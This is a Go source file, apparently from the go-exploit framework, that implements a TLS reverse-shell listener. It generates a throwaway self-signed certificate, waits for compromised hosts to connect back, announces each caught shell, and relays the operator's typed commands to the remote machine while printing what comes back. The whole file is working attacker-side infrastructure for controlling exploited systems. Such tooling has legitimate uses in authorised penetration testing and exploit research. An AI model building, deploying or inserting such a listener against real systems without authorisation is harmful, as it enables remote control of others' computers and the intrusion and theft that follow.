package sslshell

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"math/big"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/random"
)

type Server struct {
	Listener net.Listener
}

func (shellServer *Server) Init(ipAddr string, port int, isClient bool) bool {
	if isClient {
		output.PrintError("Called SSLShellServer as a client. Use lhost and lport.")

		return false
	}

	output.PrintStatus("Generating a TLS Certificate")
	certificate, ok := generateCertificate()
	if !ok {
		return false
	}

	output.PrintfStatus("Starting TLS listener on %s:%d", ipAddr, port)

	var err error
	shellServer.Listener, err = tls.Listen("tcp", ":"+strconv.Itoa(port), &tls.Config{Certificates: []tls.Certificate{certificate}})

	return err == nil
}

func (shellServer *Server) Run(timeout int) {
	// mutex for user input
	var cliLock sync.Mutex

	// track if we got a shell or not
	success := false

	// terminate the server if no shells come in within timeout seconds
	go func() {
		time.Sleep(time.Duration(timeout) * time.Second)
		if !success {
			output.PrintError("Timeout met. Shutting down shell listener.")
			shellServer.Listener.Close()
		}
	}()

	// Accept arbitrary connections. In the future we need something for the
	// user to select which connection to make active
	for {
		client, err := shellServer.Listener.Accept()
		if err != nil {
			if !strings.Contains(err.Error(), "use of closed network connection") {
				output.PrintError(err.Error())
			}

			return
		}
		success = true
		output.PrintfSuccess("Caught new shell from %v", client.RemoteAddr())
		go handleSimpleConn(client, &cliLock, client.RemoteAddr())
	}
}

func generateCertificate() (tls.Certificate, bool) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		output.PrintError(err)

		return tls.Certificate{}, false
	}

	template := x509.Certificate{
		SerialNumber:          big.NewInt(8),
		Subject:               pkix.Name{CommonName: random.RandLetters(12)},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(24 * time.Hour),
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certificateBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		output.PrintError(err)

		return tls.Certificate{}, false
	}

	certificate := tls.Certificate{
		Certificate: [][]byte{certificateBytes},
		PrivateKey:  privateKey,
	}

	return certificate, true
}

func handleSimpleConn(client net.Conn, cliLock *sync.Mutex, remoteAddr net.Addr) {
	// connections will stack up here. Currently that will mean a race
	// to the next connection but we can add in attacker handling of
	// connections latter
	cliLock.Lock()

	output.PrintfStatus("Active shell from %v", remoteAddr)
	buffReader := bufio.NewReader(client)
	for {
		// give the user a prompt and ask them for input
		fmt.Print("$ ")
		reader := bufio.NewReader(os.Stdin)
		userInput, _ := reader.ReadString('\n')
		_, writeError := client.Write([]byte(userInput))
		if writeError != nil {
			client.Close()
			output.PrintfError("Shell from %v terminated", remoteAddr)
			cliLock.Unlock()

			return
		}

		// this shell expect some type of response. give a high timeout on the
		// first read and a tight timeout on the remaining.
		wait := 10000
		for {
			err := client.SetReadDeadline(time.Now().Add(time.Duration(wait) * time.Millisecond))
			if err != nil {
				client.Close()
				output.PrintfError("Shell from %v terminated", remoteAddr)
				cliLock.Unlock()

				return
			}
			line, err := buffReader.ReadBytes('\n')
			if err != nil {
				if !strings.Contains(err.Error(), "i/o timeout") {
					client.Close()
					output.PrintfError("Shell from %v terminated", remoteAddr)
					cliLock.Unlock()

					return
				}

				break
			}
			fmt.Print(string(line))
			wait = 100
		}
	}
}
